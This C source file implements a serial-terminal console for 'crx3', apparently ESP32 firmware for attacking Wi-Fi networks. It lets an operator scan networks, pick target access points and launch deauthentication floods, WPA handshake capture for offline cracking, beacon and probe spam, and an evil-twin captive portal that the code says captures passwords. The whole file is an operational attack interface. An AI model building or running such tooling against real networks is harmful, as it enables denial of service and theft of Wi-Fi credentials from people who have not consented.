/**
 * @file serial_console.c
 * @brief USB/UART interactive console for crx3.
 *
 * Lets the device be driven entirely from a serial terminal (great for phones
 * with apps like "Serial USB Terminal", which can auto-open on USB attach),
 * without needing the Wi-Fi management AP + web page.
 *
 * The console does not reimplement the attacks: it builds the very same
 * attack_request_t the web UI sends and posts it on WEBSERVER_EVENTS, so the
 * whole existing attack pipeline (attack.c -> attack_* modules) is reused.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

#include "sdkconfig.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_console.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_event.h"

#include "serial_console.h"
#include "serial_api.h"       /* machine-readable API bridge for the hosted web UI */
#include "webserver.h"        /* WEBSERVER_EVENTS, attack_request_t */
#include "wifi_controller.h"  /* scan + AP records */
#include "attack.h"           /* attack_get_status, attack_stop_current, types */
#include "attack_method.h"    /* DEAUTH_INTENSITY_MAX */

static const char *TAG = "serial_console";

/* ── Session state ───────────────────────────────────────────────────────── */
#define SEL_MAX MAX_ATTACK_TARGETS      /* 16 */
static uint8_t s_sel[SEL_MAX];
static uint8_t s_sel_count = 0;
static uint8_t s_intensity = 3;

/* ── Helpers ─────────────────────────────────────────────────────────────── */
static const char *type_name(uint8_t t) {
    switch (t) {
        case ATTACK_TYPE_HANDSHAKE:   return "handshake";
        case ATTACK_TYPE_DOS:         return "deauth";
        case ATTACK_TYPE_BEACON_SPAM: return "beacon";
        case ATTACK_TYPE_PROBE:       return "ghost";
        case ATTACK_TYPE_EVIL_TWIN:   return "eviltwin";
        default:                      return "none";
    }
}

static void print_ap_list(void) {
    const wifictl_ap_records_t *recs = wifictl_get_ap_records();
    if (!recs || recs->count == 0) {
        printf("No APs found. Run 'scan'.\r\n");
        return;
    }
    printf("\r\n idx  rssi  ch  bssid              ssid\r\n");
    printf("----  ----  --  -----------------  --------------------------------\r\n");
    for (unsigned i = 0; i < recs->count; i++) {
        const wifi_ap_record_t *r = &recs->records[i];
        printf("%3u  %4d  %2u  %02x:%02x:%02x:%02x:%02x:%02x  %s\r\n",
               i, r->rssi, r->primary,
               r->bssid[0], r->bssid[1], r->bssid[2], r->bssid[3], r->bssid[4], r->bssid[5],
               (const char *) r->ssid);
    }
    printf("\r\n%u AP(s). Select targets with: select <idx> [idx...]\r\n", recs->count);
}

static void print_selection(void) {
    if (s_sel_count == 0) { printf("No targets selected.\r\n"); return; }
    const wifictl_ap_records_t *recs = wifictl_get_ap_records();
    printf("Selected %u target(s):\r\n", s_sel_count);
    for (int i = 0; i < s_sel_count; i++) {
        uint8_t idx = s_sel[i];
        const char *ssid = (recs && idx < recs->count) ? (const char *) recs->records[idx].ssid : "?";
        printf("  [%u] %s\r\n", idx, ssid);
    }
}

/* Builds and posts an attack_request_t, reusing the web pipeline.
 * When use_selection is true, the currently selected APs are the targets;
 * otherwise ap_count_or_mode is written into ap_count (used as "mode" by
 * beacon spam, or 0 for target-less attacks). */
static void post_attack(uint8_t type, uint8_t method, uint8_t ap_count_or_mode,
                        uint16_t timeout, uint8_t intensity, bool use_selection) {
    attack_request_t req;
    memset(&req, 0, sizeof(req));
    req.type      = type;
    req.method    = method;
    req.timeout   = timeout;
    req.intensity = intensity;

    if (use_selection) {
        req.ap_count = s_sel_count;
        for (int i = 0; i < s_sel_count; i++) req.ap_record_ids[i] = s_sel[i];
    } else {
        req.ap_count = ap_count_or_mode;
    }

    esp_event_post(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_REQUEST,
                   &req, sizeof(req), portMAX_DELAY);
}

/* ── Commands ────────────────────────────────────────────────────────────── */
static int cmd_scan(int argc, char **argv) {
    printf("Scanning nearby networks...\r\n");
    wifictl_scan_nearby_aps();
    print_ap_list();
    return 0;
}

static int cmd_list(int argc, char **argv) {
    print_ap_list();
    return 0;
}

static int cmd_select(int argc, char **argv) {
    if (argc < 2) { printf("usage: select <idx> [idx...]\r\n"); return 1; }
    const wifictl_ap_records_t *recs = wifictl_get_ap_records();
    unsigned count = recs ? recs->count : 0;
    for (int a = 1; a < argc; a++) {
        int idx = atoi(argv[a]);
        if (idx < 0 || (unsigned) idx >= count) { printf("skip invalid idx %d\r\n", idx); continue; }
        if (s_sel_count >= SEL_MAX) { printf("selection full (%d)\r\n", SEL_MAX); break; }
        bool dup = false;
        for (int i = 0; i < s_sel_count; i++) if (s_sel[i] == idx) dup = true;
        if (!dup) s_sel[s_sel_count++] = (uint8_t) idx;
    }
    print_selection();
    return 0;
}

static int cmd_targets(int argc, char **argv) { print_selection(); return 0; }

static int cmd_clear(int argc, char **argv) {
    s_sel_count = 0;
    printf("Selection cleared.\r\n");
    return 0;
}

static int cmd_intensity(int argc, char **argv) {
    if (argc < 2) { printf("intensity = %u (1..%d)\r\n", s_intensity, DEAUTH_INTENSITY_MAX); return 0; }
    int v = atoi(argv[1]);
    if (v < 1) v = 1;
    if (v > DEAUTH_INTENSITY_MAX) v = DEAUTH_INTENSITY_MAX;
    s_intensity = (uint8_t) v;
    printf("intensity set to %u\r\n", s_intensity);
    return 0;
}

static uint8_t parse_deauth_method(const char *s) {
    if (!strcmp(s, "bssid"))      return 0;   /* rogue AP / BSSID clone */
    if (!strcmp(s, "normal"))     return 1;   /* broadcast deauth       */
    if (!strcmp(s, "multiclone")) return 3;   /* rogue AP + clones      */
    if (!strcmp(s, "targeted"))   return 4;   /* sniff + per-client      */
    return 0xFF;
}

static int cmd_deauth(int argc, char **argv) {
    if (s_sel_count == 0) { printf("No targets. Run 'scan' then 'select <idx>'.\r\n"); return 1; }
    const char *mname = (argc >= 2) ? argv[1] : "normal";
    uint8_t method = parse_deauth_method(mname);
    if (method == 0xFF) { printf("method must be: bssid | normal | multiclone | targeted\r\n"); return 1; }
    uint8_t inten = s_intensity;
    if (argc >= 3) { int v = atoi(argv[2]); if (v >= 1 && v <= DEAUTH_INTENSITY_MAX) inten = (uint8_t) v; }
    post_attack(ATTACK_TYPE_DOS, method, 0, 0, inten, true);
    printf("Deauth started: method=%s, intensity=%u, %u target(s). Type 'stop' to end.\r\n",
           mname, inten, s_sel_count);
    return 0;
}

static int cmd_handshake(int argc, char **argv) {
    if (s_sel_count == 0) { printf("No target. Select one AP first.\r\n"); return 1; }
    uint8_t method = 1;   /* normal deauth */
    if (argc >= 2) {
        if      (!strcmp(argv[1], "bssid"))  method = 0;
        else if (!strcmp(argv[1], "normal")) method = 1;
        else if (!strcmp(argv[1], "silent")) method = 2;
        else { printf("method must be: bssid | normal | silent\r\n"); return 1; }
    }
    post_attack(ATTACK_TYPE_HANDSHAKE, method, 0, 0, s_intensity, true);
    printf("Handshake capture started. Use 'status'; download the .pcap/.hccapx via the web UI if enabled.\r\n");
    return 0;
}

static uint8_t parse_beacon_mode(const char *s) {
    if (!strcmp(s, "common"))   return 0;
    if (!strcmp(s, "random"))   return 1;
    if (!strcmp(s, "rickroll")) return 2;
    if (!strcmp(s, "security")) return 3;
    return 0;
}

static int cmd_beacon(int argc, char **argv) {
    int count = 20;
    if (argc >= 2) count = atoi(argv[1]);
    if (count < 1) count = 1;
    if (count > 200) count = 200;
    uint8_t mode = (argc >= 3) ? parse_beacon_mode(argv[2]) : 0;
    post_attack(ATTACK_TYPE_BEACON_SPAM, (uint8_t) count, mode, 0, s_intensity, false);
    printf("Beacon spam started: %d fake SSIDs, mode=%u. Type 'stop' to end.\r\n", count, mode);
    return 0;
}

static int cmd_ghost(int argc, char **argv) {
    post_attack(ATTACK_TYPE_PROBE, 0, 0, 0, s_intensity, false);
    printf("Ghost mode (probe spam) started. Type 'stop' to end.\r\n");
    return 0;
}

static int cmd_eviltwin(int argc, char **argv) {
    if (s_sel_count == 0) { printf("No target. Select one AP first.\r\n"); return 1; }
#if !CONFIG_CRX3_START_WEB_INTERFACE
    printf("WARNING: web interface is disabled, so the captive portal is not served and\r\n"
           "         evil twin cannot capture passwords. Enable CONFIG_CRX3_START_WEB_INTERFACE.\r\n");
#endif
    post_attack(ATTACK_TYPE_EVIL_TWIN, 0, 0, 0, s_intensity, true);
    printf("Evil twin started on target.\r\n");
    return 0;
}

static int cmd_stop(int argc, char **argv) {
    attack_stop_current();
    printf("Attack stopped.\r\n");
    return 0;
}

static int cmd_status(int argc, char **argv) {
    const attack_status_t *st = attack_get_status();
    const char *state =
        (st->state == READY)    ? "READY"    :
        (st->state == RUNNING)  ? "RUNNING"  :
        (st->state == FINISHED) ? "FINISHED" : "TIMEOUT";
    printf("state=%s  type=%s  result=%u bytes  intensity=%u  targets=%u\r\n",
           state, type_name(st->type), st->content_size, s_intensity, s_sel_count);
    return 0;
}

static int cmd_log(int argc, char **argv) {
    if (argc < 2) { printf("usage: log <error|warn|info|debug|verbose>\r\n"); return 1; }
    esp_log_level_t lvl;
    if      (!strcmp(argv[1], "error"))   lvl = ESP_LOG_ERROR;
    else if (!strcmp(argv[1], "warn"))    lvl = ESP_LOG_WARN;
    else if (!strcmp(argv[1], "info"))    lvl = ESP_LOG_INFO;
    else if (!strcmp(argv[1], "debug"))   lvl = ESP_LOG_DEBUG;
    else if (!strcmp(argv[1], "verbose")) lvl = ESP_LOG_VERBOSE;
    else { printf("unknown level\r\n"); return 1; }
    esp_log_level_set("*", lvl);
    printf("log level set to %s\r\n", argv[1]);
    return 0;
}

static int cmd_reboot(int argc, char **argv) {
    printf("Rebooting...\r\n");
    esp_restart();
    return 0;
}

/* ── Registration ────────────────────────────────────────────────────────── */
static void register_command(const char *cmd, const char *help, esp_console_cmd_func_t func) {
    const esp_console_cmd_t c = { .command = cmd, .help = help, .hint = NULL, .func = func };
    ESP_ERROR_CHECK(esp_console_cmd_register(&c));
}

static void print_banner(void) {
    printf("\r\n");
    printf("========================================\r\n");
    printf("  crx3 serial console\r\n");
    printf("  type 'help' for the command list\r\n");
    printf("========================================\r\n");
    printf("Quick start:  scan  ->  select <idx>  ->  deauth targeted\r\n\r\n");
}

void serial_console_start(void) {
    /* Keep the terminal readable: drop the boot-time log spam to warnings.
     * Raise it again at runtime with:  log info   */
    esp_log_level_set("*", ESP_LOG_WARN);

    esp_console_repl_t *repl = NULL;
    esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
    repl_config.prompt = "crx3>";
    repl_config.max_cmdline_length = 2048;   /* headroom for base64 API frames (chunked
                                               * uploads keep raw chunks small — ~600B —
                                               * so this only needs to cover form bodies
                                               * like settings/printer-print, not files) */
    repl_config.task_stack_size = 8192;

    esp_console_dev_uart_config_t uart_config = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_uart(&uart_config, &repl_config, &repl));

    esp_console_register_help_command();

    register_command("scan",      "Scan nearby Wi-Fi networks and list them",            cmd_scan);
    register_command("list",      "Re-print the last scan results",                      cmd_list);
    register_command("select",    "Select target AP(s) by index: select <idx> [idx...]", cmd_select);
    register_command("targets",   "Show the currently selected targets",                 cmd_targets);
    register_command("clear",     "Clear the target selection",                          cmd_clear);
    register_command("intensity", "Get/set deauth intensity 1..50: intensity [n]",       cmd_intensity);
    register_command("deauth",    "Deauth: deauth <bssid|normal|multiclone|targeted> [intensity]", cmd_deauth);
    register_command("handshake", "WPA handshake capture: handshake <bssid|normal|silent>", cmd_handshake);
    register_command("beacon",    "Beacon spam: beacon <count> <common|random|rickroll|security>", cmd_beacon);
    register_command("ghost",     "Ghost mode / probe spam (no target needed)",          cmd_ghost);
    register_command("eviltwin",  "Evil twin on selected target (needs web enabled)",    cmd_eviltwin);
    register_command("stop",      "Stop the running attack",                             cmd_stop);
    register_command("status",    "Show current attack status",                          cmd_status);
    register_command("log",       "Set log verbosity: log <error|warn|info|debug|verbose>", cmd_log);
    register_command("reboot",    "Restart the device",                                  cmd_reboot);

    /* Machine-readable bridge for the hosted web UI (Web Serial / WebUSB). */
    serial_api_register();

    print_banner();
    ESP_ERROR_CHECK(esp_console_start_repl(repl));
    ESP_LOGI(TAG, "Serial console started");
}
